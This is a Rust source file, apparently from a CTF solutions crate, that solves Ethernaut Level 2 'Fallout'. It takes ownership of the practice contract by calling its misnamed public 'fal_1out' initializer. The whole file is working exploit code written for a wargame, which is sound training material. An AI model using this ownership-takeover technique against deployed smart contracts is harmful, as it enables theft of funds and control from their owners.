use async_trait::async_trait;
use ctf::ethernaut::lvl02_fallout::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    /**
     * @title Ethernaut Level 2: Fallout
     *
     * Claim ownership of the contract below to complete
     * this level.
     */
    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = Fallout::new(target.address, offender.clone());

        contract.fal_1out().send().await?.await?;

        Ok(())
    }
}
